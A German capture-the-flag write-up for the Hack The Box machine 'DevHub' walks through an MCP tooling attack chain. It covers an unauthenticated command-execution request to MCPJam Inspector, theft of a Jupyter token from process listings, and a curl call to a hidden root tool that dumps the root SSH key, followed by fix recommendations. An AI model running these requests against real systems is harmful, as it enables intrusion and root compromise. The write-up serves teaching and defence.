# Hack The Box: DevHub Writeup

> **Public-Safety-Hinweis:** Flags sind absichtlich nicht enthalten. Private Schlüssel, Tokens und Secrets sind redigiert. Diese Maschine war zum Zeitpunkt des Writeups aktiv (Season 11) — Repo privat halten bis zum Retire.

- **Box:** DevHub
- **OS:** Linux (Ubuntu 24.04)
- **Schwierigkeit:** Medium
- **Status:** Gerootet ✓
- **Thema:** Model Context Protocol (MCP) Tooling-Sicherheit

## Überblick

DevHub ist eine durchgehende MCP-Security-Maschine. Jede Stufe der Kette ist ein realer Fehler aus dem MCP-/Dev-Tooling-Umfeld:

1. Foothold über eine unauthentifizierte RCE im **MCPJam Inspector** (CVE-2026-23744).
2. Lateral Movement zu `analyst` durch ein in der Prozess-Kommandozeile geleaktes **Jupyter-Token**.
3. Privilege Escalation zu `root` über einen als root laufenden, selbstgebauten **"OPSMCP"-Flask-Server** mit hardkodiertem API-Key und einem "versteckten" Tool, das den root-SSH-Key dumpt.

## Recon

```bash
nmap -Pn -sC -sV <target>
nmap -Pn -p- --min-rate 5000 <target>
```

Offene Ports:

| Port | Dienst |
|------|--------|
| 22   | OpenSSH |
| 80   | nginx 1.18.0 → Redirect auf `devhub.htb` |
| 6274 | MCPJam Inspector (Node) |

Die Landing-Page auf `devhub.htb` bewirbt explizit die internen Komponenten:

- "MCP Inspector — Active - Port 6274"
- "Analytics Dashboard — Internal Only - localhost:8888" (Jupyter)
- Tech-Stack: Node.js, Python 3, Jupyter, **MCP Protocol**, Ubuntu 24.04

Intern (nur `127.0.0.1`, später nach Foothold sichtbar): `8888` (Jupyter Lab) und `5000` (OPSMCP).

## Foothold — CVE-2026-23744 (MCPJam Inspector RCE)

Port 6274 liefert den **MCPJam Inspector**. Versionen ≤ 1.4.2 binden auf `0.0.0.0` und exponieren den Server-Management-Endpoint `/api/mcp/connect` **ohne Authentifizierung**. Der Endpoint nimmt `command` + `args` entgegen und startet damit einen lokalen stdio-MCP-Server — also einen beliebigen Prozess.

```bash
curl -X POST http://<target>:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d '{"serverConfig":{"command":"/bin/bash","args":["-c","<COMMAND>"],"env":{}},"serverId":"x"}'
```

Hinweis: Einzel-Commands terminieren zu schnell für den MCP-Handshake (Antwort `MCP error -32000: Connection closed`), aber der Befehl läuft vorher. Für stabilen Zugang entweder eine Reverse-Shell starten oder direkt einen SSH-Public-Key in `~/.ssh/authorized_keys` schreiben. Ergebnis: Shell als **`mcp-dev`**.

## Enumeration / mcp-dev → analyst

Als `mcp-dev` zeigt die Prozessliste das komplette Jupyter-Kommando — inklusive Token:

```bash
ps auxww | grep jupyter
# analyst ... jupyter-lab --ip=127.0.0.1 --port=8888 --ServerApp.token=<REDACTED_TOKEN> ...
```

Lehre: **Secrets gehören nicht in Prozess-Argumente** — jeder lokale User liest sie via `ps` / `/proc/<pid>/cmdline`.

Jupyter Lab läuft als **`analyst`**. Über einen SSH-Local-Forward auf 8888 und das geleakte Token lässt sich ein Kernel starten und beliebiger Python-Code als `analyst` ausführen:

```bash
ssh -L 8888:127.0.0.1:8888 mcp-dev@<target> -fN
# danach via Jupyter REST + Kernel-Websocket (Token-Auth) Code als analyst ausführen
```

Damit: `user.txt` gelesen (Flag hier nicht enthalten) und SSH-Key für `analyst` hinterlegt.

## Privilege Escalation / analyst → root

Als `analyst` ist `/opt/opsmcp/server.py` lesbar — ein als **root** laufender Flask-Service auf `127.0.0.1:5000` ("OPSMCP"). Auffälligkeiten im Quellcode:

- Hardkodierter API-Key: `X-API-Key` (Wert redigiert).
- Zwei **"hidden tools"**, die zwar aus `/tools/list` ausgeblendet, aber über `ALL_TOOLS` weiterhin per `/tools/call` aufrufbar sind.
- `ops._admin_dump` mit `target=ssh_keys, confirm=true` liest `/root/.ssh/id_rsa` und gibt ihn zurück.

```bash
curl -X POST http://127.0.0.1:5000/tools/call \
  -H 'Content-Type: application/json' -H 'X-API-Key: <REDACTED>' \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

Der zurückgegebene root-Private-Key erlaubt direkten Login:

```bash
ssh -i root_id_rsa root@<target>   # → uid=0(root), root.txt
```

## Kill Chain

```
MCPJam Inspector RCE (CVE-2026-23744, :6274)
        └─> mcp-dev (SSH-Key injiziert)
              └─> Jupyter-Token aus ps  →  analyst (Kernel-Code-Exec)  →  user.txt
                    └─> /opt/opsmcp (root, :5000) ops._admin_dump → /root/.ssh/id_rsa  →  root  →  root.txt
```

## Takeaways

- **CVE-2026-23744**: MCPJam Inspector ≤ 1.4.2 — unauth RCE über `/api/mcp/connect`, Default-Bind auf `0.0.0.0`. Fix in **1.4.3** (bindet nur lokal + Auth).
- "Versteckte" Tools sind keine Sicherheitsgrenze — wenn sie registriert und aufrufbar sind, sind sie erreichbar. Security ≠ Obscurity.
- root-laufende Automatisierungs-/MCP-Dienste mit Datei-Lese-Funktionen sind ein direkter Privesc-Vektor.

## Empfehlungen

- MCPJam Inspector auf ≥ 1.4.3 aktualisieren; Dev-Tools niemals auf `0.0.0.0` exponieren, immer Auth + localhost-Bind.
- Jupyter ohne Token-in-Argv betreiben (Config-Datei / Env mit restriktiven Rechten); Secrets aus Prozess-Args fernhalten.
- Keine hardkodierten Keys in Quellcode; keine Datei-Lese-/Dump-Funktionen in root-Diensten ohne strikte Autorisierung.
- Interne Dienste (Jupyter, OPSMCP) konsequent nur auf `127.0.0.1` und mit echtem Auth-Layer.
